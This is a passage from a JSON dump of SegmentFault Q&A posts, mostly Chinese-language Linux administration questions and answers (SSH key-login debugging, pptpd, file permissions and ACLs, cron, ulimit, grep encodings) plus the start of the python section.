USER\ndebug3: Ignored env LS_COLORS\ndebug3: Ignored env MAIL\ndebug3: Ignored env PATH\ndebug3: Ignored env PWD\ndebug1: Sending env LANG = zh_CN.UTF-8\ndebug2: channel 0: request env confirm 0\ndebug3: Ignored env SSH_ASKPASS\ndebug3: Ignored env HISTCONTROL\ndebug3: Ignored env SHLVL\ndebug3: Ignored env HOME\ndebug3: Ignored env LOGNAME\ndebug3: Ignored env QTLIB\ndebug3: Ignored env CVS_RSH\ndebug3: Ignored env SSH_CONNECTION\ndebug3: Ignored env LESSOPEN\ndebug3: Ignored env G_BROKEN_FILENAMES\ndebug3: Ignored env _\ndebug2: channel 0: request shell confirm 1\ndebug2: fd 3 setting TCP_NODELAY\ndebug2: callback done\ndebug2: channel 0: open confirm rwindow 0 rmax 32768\ndebug3: Wrote 448 bytes for a total of 2693\ndebug2: channel_input_status_confirm: type 99 id 0\ndebug2: PTY allocation request accepted on channel 0\ndebug2: channel 0: rcvd adjust 2097152\ndebug2: channel_input_status_confirm: type 99 id 0\ndebug2: shell request accepted on channel 0\nLast login: Tue Jul 22 17:58:15 2014 from 222.131.6.36\n</code></pre>\n<p>diff 比较下，结果如下：</p>\n<pre><code>80,81c80,81\n&lt; debug2: dh_gen_key: priv key bits set: 138/256\n&lt; debug2: bits set: 543/1024\n---\n&gt; debug2: dh_gen_key: priv key bits set: 132/256\n&gt; debug2: bits set: 485/1024\n89c89\n&lt; debug2: bits set: 529/1024\n---\n&gt; debug2: bits set: 491/1024\n103c103\n&lt; debug2: key: /root/.ssh/id_rsa (0x7f28a1df8bb0)\n---\n&gt; debug2: key: /root/.ssh/id_rsa (0x7f9577792bc0)\n143,195c143,151\n&lt; debug1: Server accepts key: pkalg ssh-rsa blen 277\n&lt; debug2: input_userauth_pk_ok: SHA1 fp a8:19:63:d5:be:eb:7c:cd:c2:f9:b5:72:c9:84:dc:ec:e1:43:24:2d\n&lt; debug3: sign_and_send_pubkey\n&lt; debug1: read PEM private key done: type RSA\n&lt; debug3: Wrote 640 bytes for a total of 2117\n&lt; debug1: Authentication succeeded (publickey).\n&lt; debug1: channel 0: new [client-session]\n&lt; debug3: ssh_session2_open: channel_new: 0\n&lt; debug2: channel 0: send open\n&lt; debug1: Requesting no-more-sessions@openssh.com\n&lt; debug1: Entering interactive session.\n&lt; debug3: Wrote 128 bytes for a total of 2245\n&lt; debug2: callback start\n&lt; debug2: client_session2_setup: id 0\n&lt; debug2: channel 0: request pty-req confirm 1\n&lt; debug1: Sending environment.\n&lt; debug3: Ignored env HOSTNAME\n&lt; debug3: Ignored env TERM\n&lt; debug3: Ignored env SHELL\n&lt; debug3: Ignored env HISTSIZE\n&lt; debug3: Ignored env SSH_CLIENT\n&lt; debug3: Ignored env QTDIR\n&lt; debug3: Ignored env QTINC\n&lt; debug3: Ignored env SSH_TTY\n&lt; debug3: Ignored env USER\n&lt; debug3: Ignored env LS_COLORS\n&lt; debug3: Ignored env MAIL\n&lt; debug3: Ignored env PATH\n&lt; debug3: Ignored env PWD\n&lt; debug1: Sending env LANG = zh_CN.UTF-8\n&lt; debug2: channel 0: request env confirm 0\n&lt; debug3: Ignored env SSH_ASKPASS\n&lt; debug3: Ignored env HISTCONTROL\n&lt; debug3: Ignored env SHLVL\n&lt; debug3: Ignored env HOME\n&lt; debug3: Ignored env LOGNAME\n&lt; debug3: Ignored env QTLIB\n&lt; debug3: Ignored env CVS_RSH\n&lt; debug3: Ignored env SSH_CONNECTION\n&lt; debug3: Ignored env LESSOPEN\n&lt; debug3: Ignored env G_BROKEN_FILENAMES\n&lt; debug3: Ignored env _\n&lt; debug2: channel 0: request shell confirm 1\n&lt; debug2: fd 3 setting TCP_NODELAY\n&lt; debug2: callback done\n&lt; debug2: channel 0: open confirm rwindow 0 rmax 32768\n&lt; debug3: Wrote 448 bytes for a total of 2693\n&lt; debug2: channel_input_status_confirm: type 99 id 0\n&lt; debug2: PTY allocation request accepted on channel 0\n&lt; debug2: channel 0: rcvd adjust 2097152\n&lt; debug2: channel_input_status_confirm: type 99 id 0\n&lt; debug2: shell request accepted on channel 0\n&lt; Last login: Tue Jul 22 18:21:52 2014 from 222.131.6.36\n\\ No newline at end of file\n---\n&gt; debug1: Authentications that can continue: publickey,gssapi-keyex,gssapi-with-mic,password\n&gt; debug1: Trying private key: /root/.ssh/id_dsa\n&gt; debug3: no such identity: /root/.ssh/id_dsa\n&gt; debug2: we did not send a packet, disable method\n&gt; debug3: authmethod_lookup password\n&gt; debug3: remaining preferred: ,password\n&gt; debug3: authmethod_is_enabled password\n&gt; debug1: Next authentication method: password\n&gt; test@192.168.56140's password: \n\\ No newline at end of file\n</code></pre>\n</div>",
      "favourite": "1",
      "glance": "18.2k",
      "tags": [
        "linux"
      ],
      "time": "2014-07-22",
      "title": "普通用户 ssh 密钥登录失败的问题，困惑了很久",
      "url": "https://segmentfault.com/q/1010000000613569"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000614237\">\n<p>有的编辑器和工具会检查这个, 有时候会给出提示, 是否有相应的标准规定?</p>\n</div>",
      "favourite": "3",
      "glance": "3.1k",
      "tags": [
        "linux"
      ],
      "time": "2014-07-22",
      "title": "什么时候程序源码文件末尾要有空行? 是怎么规定和考虑的",
      "url": "https://segmentfault.com/q/1010000000614237"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000647195\">\n<p>linux,pptp的服务器.</p>\n<p>配置文件<code>/etc/pptpd.conf</code>中,<code>remoteip</code>一项.看说明都是类似</p>\n<pre><code>remoteip 10.0.0.2-254\n</code></pre>\n<p>这样的.目前需求客户端数量大于255个,比如10万个客户端.显然这样配置客户端分配的ip是不够的.</p>\n<p>不太懂网络这一块,有什么不对的请务必指出.</p>\n<hr>\n<p>如果简单的就2个网段,参考<a href=\"http://serverfault.com/questions/512751/more-than-254-client-ips-in-pptp-pptpd\" rel=\"nofollow\">这里</a>可能这样分配</p>\n<pre><code>remoteip 10.0.0.2-254,10.0.1.2-254,10.0.2.2-254\n</code></pre>\n<p>但是如果多一个数量级,这种方式看上去就有点丑了.</p>\n<hr>\n<p>看来一些<a href=\"https://github.com/inouema/LEON3onNEEK/blob/05a18d808d484755b0fccbca2f04ae1261b47b0c/linux/snapgear-2.6-p42/user/pptpd/defaults.h\" rel=\"nofollow\">pptpd的源代码</a>,如果多于<code>MAX_CONNECTIONS</code>个remoteip的话必须修改这个宏.目前看上去这个数值是100.</p>\n<p>但这不是重点,我想可能自己编译pptpd的程序,能自己改源代码.比如改成100000什么的,但各位大神有没有指点的,这里有没有什么坑,这个数值受那些因数限制? <strong>望点拨</strong> .</p>\n</hr></hr></div>",
      "favourite": "0",
      "glance": "3.2k",
      "tags": [
        "linux",
        "pptp"
      ],
      "time": "2014-08-24",
      "title": "pptpd如何指定大量可用IP地址",
      "url": "https://segmentfault.com/q/1010000000647195"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000667253\">\n<p>应该是跟io接口相关的东西，能具体解释下吗，菜鸟感觉很神秘的样子。</p>\n<pre><code>autofs           mcelog              sdb       tty3   tty6       ttyS30\nblock            mem                 sg0       tty30  tty60      ttyS31\nbsg              net                 sg1       tty31  tty61      ttyS4\nbtrfs-control    network_latency     shm       tty32  tty62      ttyS5\nbus              network_throughput  snapshot  tty33  tty63      ttyS6\nchar             null                snd       tty34  tty7       ttyS7\nconsole          port                stderr    tty35  tty8       ttyS8\ncore             ppp                 stdin     tty36  tty9       ttyS9\ncpu              psaux               stdout    tty37  ttyprintk  uhid\ncpu_dma_latency  ptmx                tty       tty38  ttyS0      uinput\ncuse             pts                 tty0      tty39  ttyS1      urandom\ndisk             ram0                tty1      tty4   ttyS10     vcs\ndri              ram1                tty10     tty40  ttyS11     vcs1\necryptfs         ram10               tty11     tty41  ttyS12     vcs2\nfb0              ram11               tty12     tty42  ttyS13     vcs3\nfd               ram12               tty13     tty43  ttyS14     vcs4\nfull             ram13               tty14     tty44  ttyS15     vcs5\nfuse             ram14               tty15     tty45  ttyS16     vcs6\nhidraw0          ram15               tty16     tty46  ttyS17     vcs7\nhpet             ram2                tty17     tty47  ttyS18     vcsa\ninput            ram3                tty18     tty48  ttyS19     vcsa1\nkmsg             ram4                tty19     tty49  ttyS2      vcsa2\nlog              ram5                tty2      tty5   ttyS20     vcsa3\nloop0            ram6                tty20     tty50  ttyS21     vcsa4\nloop1            ram7                tty21     tty51  ttyS22     vcsa5\nloop2            ram8                tty22     tty52  ttyS23     vcsa6\nloop3            ram9                tty23     tty53  ttyS24     vcsa7\nloop4            random              tty24     tty54  ttyS25     vga_arbiter\nloop5            rfkill              tty25     tty55  ttyS26     vhost-net\nloop6            rtc                 tty26     tty56  ttyS27     virtio-ports\nloop7            rtc0                tty27     tty57  ttyS28     vport5p1\nloop-control     sda                 tty28     tty58  ttyS29     zero\nmapper           sda1                tty29     tty59  ttyS3\n</code></pre>\n</div>",
      "favourite": "1",
      "glance": "3.2k",
      "tags": [
        "linux"
      ],
      "time": "2014-09-13",
      "title": "linux系统下/dev目录下的这些文件都代表了什么呢",
      "url": "https://segmentfault.com/q/1010000000667253"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000670283\">\n<p>判断是不是数据源的问题，按照网上的，在source.list增加了163的源，但还是安装不了，求解！</p>\n<p>oracle在安装中提示的需要的package，都没有找到。</p>\n</div>",
      "favourite": "0",
      "glance": "1.4k",
      "tags": [
        "linux",
        "deepin"
      ],
      "time": "2014-09-16",
      "title": "deepin安装oracle客户端，要求下载gcc，make等package，但我这显示找不到",
      "url": "https://segmentfault.com/q/1010000000670283"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000684412\">\n<p>Why not google it yourself? <a href=\"http://askubuntu.com/questions/143675/can-a-directory-belong-to-more-than-one-group\" rel=\"nofollow\">This link</a> for example.</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000684431\">\n<p>真的是没必要，用户和文件，二者只要有一个能属于多个组，就可以实现权限的任意组合，而且一个系统中，文件肯定比用户多。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000684459\">\n<p>谁说文件不能属于多个组的？支持 ACL 扩展就可以，现在大多数发行版都支持，只是默认它不给你显示出来罢了。</p>\n<hr>\n<p>为避免无休止的争论，特意补充说明一些观点，不强求接受，若有异议还请引用权威文档让我补补课，争论就免了吧。</p>\n<p>首先我上面的回答其实也不严谨，文件的确不能“属于”多个组，因为“属于”这个概念根本就是错的。只不过国内的开发者们嘴上说习惯了，算是一种约定俗成吧，加上楼主的原题就是这么问的，我就将错就错了，因为要解释清楚的话我犯懒。但是有朋友与我争论良久，评论里面打字不方便而且总显得对人不对事，那我就多说两句好了。</p>\n<p>首先我要声明我不是在瞎说，几年前我是苹果 AATC 的认证讲师，负责的就是操作系统课程的培训和考试，也就是 ACSP 认证（如果我没记错名字的话）。当时去考讲师的时候是苹果的专家给我们上的课。ACSP 的教程里专门有一章是讲文件系统与权限管理的，而且特别有一节就是讲 ACL，当时一起上课的朋友也有问过和楼主一样的问题的，讲师就把我们训了一通，说你们以后去培训的时候千万不要说什么文件属于用户组这样误人子弟的话，这个概念捋不清楚就不要做讲师了。</p>\n<p>虽然 Mac OS 不是 Linux，但是这个血缘关系就不用多讲了，至少文件系统、权限管理以及 ACL 这些东西是没多大区别的。</p>\n<p>回到正题，为什么说“文件属于用户组”是伪命题？</p>\n<p>因为文件从来就只有一个 <em>owner</em>，也就是创建该文件的用户，并且 <em>ownership</em> 也是可以改的。从这个意义上来讲，也许文件只能真正属于文件系统或者说操作系统，只要你有足够的权限，你就“拥有”这个文件。</p>\n<p>文件创建的时候，<em>owner</em> 所属的主组会成为该文件的 <em>owner group</em>。那有人就问了，这还不能叫做“归属组”？是的，虽然我们经常看到 <em>owner group</em> 这个词出现，但是它的真实含义是 <em>owner's group</em>，它强调的是 <em>owner</em> 所在的那个组（默认是主组，可以改），而不是这个组 <em>own</em> 这个文件，要不然的话应该是该组下所有的用户都是这个文件的 <em>owner</em> 才对！可能吗？</p>\n<p>文件只能有一个 <em>owner</em>，而一个组可能有多个用户，所以如果一个组也是文件的 <em>owner</em>，那就意味着这个文件可以有多个 <em>owner</em>，但是一个文件只能有一个 <em>owner</em>……还能绕回来不？</p>\n<p>用一句话描述这种关系就是：所有者创建了文件，则默认所有者的主组具有和所有者对于访问该文件相同的权限。这是一种权限的默认分配机制，并不是宣称文件归该组所有。所以“文件属于用户组”这个说法看似成立，实则是一种误解。</p>\n<p>ACL 在原始的权限分配机制上进行了扩展，使得对于文件的默认分配机制除了可以被覆盖（也就是改变 <em>owner group</em>）之外，还可以被扩展，这当然是有意义的！因为我可以让多个组针对目标文件具有不同的访问权限，于是就可以延伸到多个用户（因为你没有办法指定多个 <em>owner</em>）。</p>\n<p>然而，并不能因此就觉得 <em>owner group</em> 要比 ACL 扩展的 <em>groups</em> 高出一筹了。就好像强调“归属组”就能比其他组多出什么权限来一样，这是一种莫名的认知。你完全可以设定其他组具有比 <em>owner group</em> 还要高的访问权限，甚至用其他组替代 <em>owner group</em>，你能说文件到底“属于”谁呢？</p>\n<p>之所以 <em>owner group</em> 这个概念还存在完全是一个历史遗留，也是因为 <em>owner</em> 一次只能有一个，所以 <em>owner group</em> 默认的就是 <em>owner</em> 的主组了。这种经典权限分配机制诞生的时候没过多考虑后来扩展的问题，这才导致如今你不用其他工具就根本看不到 ACL 分配的扩展权限。</p>\n<p>用对象关系来做一个形象的比喻，文件对象归属于一个拥有者（file belongs to a owner)，而一个拥有者可以拥有多个文件对象（owner has many files）。文件对象可以拥有多个组的访问权限（file has many groups)，用户可以拥有多个组的访问权限（user has many groups)，因此文件对象可以被多个用户以多种不同的权限访问（file can be accessed by many users w/ different permissions)</p>\n<p>这才是它们之间的正确关系，但是很显然跑题太远了。</p>\n<p>就说这些吧，我个人觉得 Linux 世界里的很多观点是永远都不可能统一的，大家求同存异就好。以上是我的理解（或者说我被洗的脑），是否接受请随意。</p>\n</hr></div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000684271\">\n<p>是没必要还是我说错了?</p>\n</div>",
      "favourite": "1",
      "glance": "5.8k",
      "tags": [
        "linux"
      ],
      "time": "2014-09-20",
      "title": "为什么linux用户可以属于多个用户组,文件只能属于一个用户组?",
      "url": "https://segmentfault.com/q/1010000000684271"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000685480\">\n<p>最好有具体的路径例子给我看看,我现在一点数都没有</p>\n</div>",
      "favourite": "1",
      "glance": "1.5k",
      "tags": [
        "linux",
        "windows"
      ],
      "time": "2014-09-21",
      "title": "linux/windows中最深的目录是什么?",
      "url": "https://segmentfault.com/q/1010000000685480"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000694167\">\n<pre><code class=\"lang-bash\">ls | sed 's/999/001/g'|sed 's/.html/.png/g'\n</code></pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000694300\">\n<p>我自己也贡献个mac版的吧！当然linux也通用</p>\n<pre><code>for i in *.html;do mv \"$i\" \"${i%999StaticPreview.html}001StaticPreview.png\" ;done\n</code></pre>\n<p>还找到了个方法，也不错</p>\n<pre><code>for fname in `ls`;do newname=`echo $fname | sed 's/999/001/;s/html$/png/'`;echo $newname;mv $fname $newname;done\n</code></pre>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000694192\">\n<p>两步<br>\n1. <code>rename -v  's/999/001/' ./*.html</code><br>\n2. <code>rename -v 's/.html/.png/' ./*.html</code><br>\n可以先在参数上添加选项 <code>-n</code>，只是显示重命名的结果，但不进行实际操作</br></br></br></p>\n</div>",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000694091\">\n<html><body>\n<p><img data-src=\"/img/bVc4Ja\"/></p>\n<p>如图所示，想把中间的999改成001，后面的html改成png，命令该咋写啊？谢谢！</p>\n</body></html>\n</div>",
      "favourite": "0",
      "glance": "2.1k",
      "tags": [
        "linux",
        "命令行"
      ],
      "time": "2014-09-25",
      "title": "求批量正则表达式修改文件名的命令。windows/linux都OK",
      "url": "https://segmentfault.com/q/1010000000694091"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000752739\">\n<p>Hello everyone, If you want to become an employee of the Linux Foundation,what do I need to do to people.First of all, I am an in high school students from mainland China,In about 18 months will take the college entrance examination.Grew up on a strong interest in the open source software has not been involved involved in any open source project . Hardly ever write any software countless times to write code in the Middle,gave up writing code. Now I find my target,and what cognitive science,was too difficult for me. . Under the influence of China's education.I would also very much like to be a scientist.In 11 careers,I came to understand the nature of scientists,do understand embarking on scientific research is hard,Although my interests in cognitive science could not say, but facing the reality I had to give up, hoping to achieve their dream of engineers to achieve so-called \" scientist's dream\" .</p>\n</div>",
      "favourite": "0",
      "glance": "1.1k",
      "tags": [
        "linux",
        "开源软件"
      ],
      "time": "2014-11-01",
      "title": "How to become an employee of the Linux Foundation?",
      "url": "https://segmentfault.com/q/1010000000752739"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000757856\">\n<p>1 先是稳定运行<br>\n2 查看日志系统报错以及警告是否多<br>\n3 php报警都解决没<br>\n4 现在才轮到apache的配置文件调优</br></br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000005983928\">\n<p>提高apache的负载？找几台机器，拿 ab 压压就可以了。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000760863\">\n<blockquote>\n<p>不用优化，默认的二进制包足够应付99%的场景。</p>\n</blockquote>\n<p>绝大多数项目都是超低流量项目，如果用户多到性能出现问题了，那性能也就不是问题了。</p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000757448\">\n<p>我对linux源代码安装apache（或者说我对所有linux源码安装都不太熟悉）。所以在生产环境中间直接使用了如下命令安装：<br><code>yum install httpd httpd-devel</code></br></p>\n<p>请问我该做哪些优化以应对生产环境呢？<br>\n不要说用nginx啊！因为是赶着上线，nginx我也不懂，如果学习完全达不到上线要求。。</br></p>\n<p>求教！！！！！！！！</p>\n</div>",
      "favourite": "0",
      "glance": "1.2k",
      "tags": [
        "apache",
        "php",
        "linux"
      ],
      "time": "2014-11-04",
      "title": "请问如何提高apache的负载？",
      "url": "https://segmentfault.com/q/1010000000757448"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000765793\">\n<p>这是2个不同的概念来的。cached是cpu与内存间的，buffer是内存与磁盘间的，都是为了解决速度不对等的问题。<br>\n             total       used       free     shared    buffers     cached<br>\nMem:         32058      23868       8189          0        400      18485<br>\n-/+ buffers/cache:       4982      27075<br>\nSwap:         7999          0       7999<br>\n从上面的信息可以看出。系统实际用了23868M，而buffers用了400，cached用了18485，前面的23868是包含了后面400的buffers和18485的cached，所以系统的物理内存的真实使用量是-buffers/cache=23868-400-18485=4983，为什么这样计算呢，因为buffers和cache其实也是内存的一部分，这部分特殊的内存是可以回收的，甚至如果需要我们还可以将这部分buffers和cache给释放出来，获得这部分的内存。</br></br></br></br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002651157\">\n<p>cache是对文件内容的缓存，buffer是对文件系统层面的缓存。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000765703\">\n<p>A buffer is something that has yet to be \"written\" to disk.<br>\nA cache is something that has been \"read\" from the disk and stored for later use.</br></p>\n</div>",
      "attention": "7",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000764237\">\n<p>linux命令free显示的cached和buffers有什么区别？</p>\n</div>",
      "favourite": "0",
      "glance": "1.7k",
      "tags": [
        "linux",
        "free"
      ],
      "time": "2014-11-07",
      "title": "linux命令free显示的cached和buffers有什么区别？",
      "url": "https://segmentfault.com/q/1010000000764237"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000777695\">\n<p>在运行一个命令的时候可以限制其消耗内存大小，我找到一个命令ulimit，但是他如果发现进程超过最大内存的话，会kill掉。这并不是我想要的，我希望只是限制使用最大内存，但不能kill掉。</p>\n</div>",
      "favourite": "0",
      "glance": "2.4k",
      "tags": [
        "linux",
        "ubuntu"
      ],
      "time": "2014-11-11",
      "title": "在linux怎么限制一个进程运行内存大小",
      "url": "https://segmentfault.com/q/1010000000777695"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000777710\">\n<p>源码是win下开发的, 我需要在mac/linux下浏览和编辑, 但是直接打开中文是乱码. 我知道vim :set fileencoding=utf-8是可以的, 但是文件比较多. 希望有更简单方法.</p>\n</div>",
      "favourite": "0",
      "glance": "1k",
      "tags": [
        "linux",
        "中文乱码"
      ],
      "time": "2014-11-11",
      "title": "怎么把一个目录和其子目录中所有源文件都转换成UTF-8编码?",
      "url": "https://segmentfault.com/q/1010000000777710"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "8",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000779355\">\n<p>fork函数是unix系统中实现多进程的一个基本函数，它看起来非常特殊。首先它创建了一个或多个自身进程的自进程，并且继承了当前进程的上下文资源。</p>\n<p>这一个过程具体是怎么完成的？它是如何做到多个进程同时监听一个资源的，比如有一个tcp连接进来，那么到底应该是哪个子进程去响应这个请求呢？如果子进程再次fork自己会发生什么，可以不停这样下去吗？</p>\n</div>",
      "favourite": "2",
      "glance": "3.3k",
      "tags": [
        "c",
        "fork",
        "linux"
      ],
      "time": "2014-11-11",
      "title": "当执行fork()函数的时候，到底发生了什么",
      "url": "https://segmentfault.com/q/1010000000779355"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002390189\">\n<p>ffmpeg 安装完第三方解码器后 如何使其生效</p>\n</div>",
      "favourite": "0",
      "glance": "1.2k",
      "tags": [
        "linux",
        "ffmpeg"
      ],
      "time": "2014-11-26",
      "title": "ffmpeg 安装完第三方解码器后 如何使其生效",
      "url": "https://segmentfault.com/q/1010000002390189"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002407086\">\n<html><body>\n<p><img data-src=\"/img/bVkglV\"/></p>\n<p>我想知道如何修改红色框框内的文字和图片<br>\n在u-boot的那个文件夹内<br>\n或者哪个文件内进行修改？</br></br></p>\n<p>请教了</p>\n</body></html>\n</div>",
      "favourite": "0",
      "glance": "1k",
      "tags": [
        "u-boot",
        "linux"
      ],
      "time": "2014-12-04",
      "title": "U-BOOT 界面修改",
      "url": "https://segmentfault.com/q/1010000002407086"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002407756\">\n<p>ulimit -a可以查看所有限制<br>\nulimit -n可以查看Open files的限制<br>\nulimit -n xxx可以修改此限制</br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002407784\">\n<p>sysctl -w fs.file-max=65535;</p>\n<p>ulimit -SHn 655350</p>\n<p>/etc/security/limits.conf 修改后面的数值</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002407837\">\n<p>一般来说要“优化”的不是linux的打开文件上限限制，而是发生了句柄泄露的应用</p>\n</div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002407746\">\n<p>如题，我的系统安装后没有做任何调整，后来发现运行一段时间后就会报这个错误。请问当出现这个错误后，应该进行哪些优化呢？这些优化的依据是什么？</p>\n</div>",
      "favourite": "1",
      "glance": "1.2k",
      "tags": [
        "linux",
        "tcp"
      ],
      "time": "2014-12-05",
      "title": "当linux系统出现too many open files的时候应该如何优化",
      "url": "https://segmentfault.com/q/1010000002407746"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002408764\">\n<p>用 <code>wget http://example.com/file.zip</code> 下载文件时，默认保存的文件名是个很长的乱七八糟的名字，虽然可以加 <code>-O</code> 参数重命名，但是还是比较麻烦。</p>\n<p>我希望 wget 能自动保存成远程文件的名字，比如：file.zip，有什么办法吗？</p>\n</div>",
      "favourite": "1",
      "glance": "1.5k",
      "tags": [
        "wget",
        "shell",
        "linux"
      ],
      "time": "2014-12-05",
      "title": "使用 wget 下载，怎样让他默认保存成远程的文件名？",
      "url": "https://segmentfault.com/q/1010000002408764"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002411983\">\n<p>如题，工程目录中有文件是utf-8格式有些是gb2312格式，使用secureCRT连接到开发机上grep中文时只能找出部分文件。</p>\n<p>求解决方法，谢谢。</p>\n<hr>\n<p>已解决，方法如下：</p>\n<ol>\n<li>假设要查找字的是<code>中文</code>，查找到它的utf-8编码和gb2312编码分别是<code>E4B8ADE69687</code>和<code>D6D0CEC4</code>（<a href=\"http://bm.kdd.cc/\" rel=\"nofollow\">这里</a>可查询到）</li>\n<li>使用grep：<code>grep -rnP \"\\xE4\\xB8\\xAD\\xE6\\x96\\x87|\\xD6\\xD0\\xCE\\xC4\" *</code>即可</li>\n</ol>\n</hr></div>",
      "favourite": "2",
      "glance": "2.6k",
      "tags": [
        "linux",
        "grep"
      ],
      "time": "2014-12-08",
      "title": "grep如何在不同编码格式的文件中查找中文",
      "url": "https://segmentfault.com/q/1010000002411983"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000002419884\">\n<p>由于 <code>crontab</code> 最小单位是分钟，只能自己写程序执行了。给个 shell + python 的例子：</p>\n<pre><code>while true ; do ./your-script &amp; ; python -c \"import time;time.sleep(0.5)\"; done\n</code></pre>\n<p>或者 python + shell:</p>\n<pre><code>import time\nfrom subprocess import call\nwhile(True):\n    call([\"./your-script\"])\n    time.sleep(0.5)\n</code></pre>\n<p>没有 linux 所以没有亲测，大概就是这么个思路</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000002419950\">\n<p>用<code>watch</code><br><code>watch -n 0.5 date</code>试试看</br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000002420746\">\n<pre><code>* * * * * for i in `seq 120`; do awesome_scripts&amp; sleep 0.5; done\n</code></pre>\n<p>由crontab每分钟调度，每次唤起，循环执行120次，间隔0.5秒</p>\n</div>",
      "attention": "14",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002419829\">\n<p>求一个例子！！！linux定时任务如何每隔0.5秒执行一次呢？</p>\n</div>",
      "favourite": "5",
      "glance": "6.6k",
      "tags": [
        "linux"
      ],
      "time": "2014-12-11",
      "title": "linux定时任务如何每隔0.5秒执行一次呢？",
      "url": "https://segmentfault.com/q/1010000002419829"
    }
  ],

  "python": [
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000386841\">\n<p>Flask-Migrate</p>\n<p><a href=\"http://flask-migrate.readthedocs.org/en/latest/\" rel=\"nofollow\"></a><a href=\"http://flask-migrate.readthedocs.org/en/latest/\" rel=\"nofollow\">http://flask-migrate.readthedocs.org/en/latest/</a></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000127693\">\n<p>试试:</p><pre>Base.metadata.create_all(engine)</pre><p><a href=\"http://docs.sqlalchemy.org/en/rel_0_7/core/schema.html#sqlalchemy.schema.MetaData.create_all\" rel=\"nofollow\" target=\"_blank\" title=\"http://docs.sqlalchemy.org/en/rel_0_7...\">http://docs.sqlalchemy.org/en/rel_0_7...</a></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000128535\">\n<p>可以使用 sqlalchemy-migrate <a href=\"http://code.google.com/p/sqlalchemy-migrate/\" rel=\"nofollow\" target=\"_blank\" title=\"http://code.google.com/p/sqlalchemy-m...\">http://code.google.com/p/sqlalchemy-m...</a><br/>\n不过更推荐 @null 说的 Alembic。他是由SQLAlchemy的作者写的 <a href=\"http://pypi.python.org/pypi/alembic\" rel=\"nofollow\" target=\"_blank\" title=\"http://pypi.python.org/pypi/alembic\">http://pypi.python.org/pypi/alembic</a></p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000126213\">\n<p>由于业务不够稳定，数据表结构变更比较频繁，当我修改（如增加）了模型结构后，希望数据库中的表结构能够相应的改变，诸如使用 <code>database.create_all()</code> 之类的语句，想问下有没有这样的语句，或有其他方便的实现方法？</p>\n</div>",
      "favourite": "4",
      "glance": "5.1k",
      "tags": [
        "sqlalchemy",
        "python"
      ],
      "time": "2012-10-10",
      "title": "当SQLAlchemy修改了模型结构后，如何更新到已有数据表",
      "url": "https://segmentfault.com/q/1010000000126213"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "7",
